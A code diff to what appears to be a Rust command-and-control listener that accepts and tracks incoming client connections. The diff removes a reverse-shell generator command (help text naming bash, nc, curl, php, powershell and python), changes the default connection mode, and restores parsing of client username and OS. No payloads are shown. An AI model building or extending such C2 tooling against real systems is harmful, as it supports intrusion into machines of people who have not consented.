@@ -23,8 +23,6 @@ fn print_help() -> String {
     output.push_str("  <args> are required, [args] are optional\n");
     output.push_str("  help                  Show this menu\n");
     output.push_str("  shell <cmd>           Run a local shell command\n");
-    output.push_str("  revshell <lang> [ip] [port]  Generate a reverse shell in specified language\n");
-    output.push_str("       Example: `revshell bash`, `nc`,`curl`,`php`,`powershell`,`python`\n\n");
     output.push_str("  connection <raw|client> Switches between a raw or c2 client connection\n");
     output.push_str("       Client connection by default, toggles when run with no arguments.\n");
     output.push_str("\n  ------------------------------------------------------------- \n");
@@ -60,7 +58,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let active_connections: Arc<Mutex<HashMap<String, ConnectionInfo>>> = Arc::new(Mutex::new(HashMap::new()));
     let active_connections_clone = active_connections.clone();
-    let raw_connection = Arc::new(Mutex::new(true));
+    let raw_connection = Arc::new(Mutex::new(false));
     let raw_connection_clone = raw_connection.clone();
 
     println!("{}",format!("Listening for incoming connections on port {} in background", port));
@@ -81,8 +79,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                             println!("{}",print_help())
                         } else if command.starts_with("shell ") {
                             locals::spawn_shell(command);
-                        } else if command.starts_with("revshell ") {
-                            locals::revshell(command);
                         } else if command.starts_with("connection") {
                             let mut raw_connection_lock = raw_connection_clone.lock().await;
                             if command.contains("raw") {
@@ -250,13 +246,12 @@ pub async fn handle_connection(
     active_connections: Arc<Mutex<HashMap<String,ConnectionInfo>>>,
     hostname: String,
     stream: TcpStream,
-    _raw_connection: bool) {
+    raw_connection: bool) {
     println!("{}", "\n[+] Connection recieved!");
-    let stream = Arc::new(Mutex::new(stream));
+    let mut stream = Arc::new(Mutex::new(stream));
     let hostname_clone = hostname.clone();
 
-    // let (username, os) = utils::parse_client_info(&mut stream, raw_connection).await;
-    let (username, os) = ("test", "test");
+    let (username, os) = utils::parse_client_info(&mut stream, raw_connection).await;
     println!("username: {}, os: {}", username, os);
     
     let id = {
